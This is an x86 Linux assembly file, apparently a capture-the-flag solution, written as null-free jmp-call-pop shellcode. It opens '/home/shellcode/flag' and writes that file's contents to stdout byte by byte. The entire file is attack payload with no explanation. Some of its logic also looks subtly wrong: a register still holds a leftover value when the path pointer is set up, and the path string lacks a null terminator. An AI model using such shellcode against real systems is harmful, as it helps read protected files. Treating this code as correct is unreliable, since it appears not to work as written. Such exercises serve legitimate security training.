;hello.asm
[SECTION .text]

global _start


_start:
  jmp short ender

starter:
  xor eax, eax
  xor ebx, ebx
  xor ecx, ecx
  xor edx, edx

print:
  mov al, 4
  mov bl, 1
  pop ecx
  mov dl, 20
  int 0x80

open:
  xor eax, eax
  mov al, 5
  xor ebx, ecx
  xor ecx, ecx
  xor edx, edx
  int 0x80

  mov esi, eax
read:
  mov ebx, esi
  mov al, 3
  sub esp, 1
  lea ecx, [esp]
  mov dl, 1
  int 0x80

  xor ebx, ebx
  cmp eax, ebx
  je  exit

  mov al, 4
  mov bl, 1
  mov dl, 1
  int 0x80
  
  jmp read

exit:
  xor eax, eax
  mov al, 1
  xor ebx, ebx
  int 0x80

  ender:
  call starter
  db '/home/shellcode/flag'
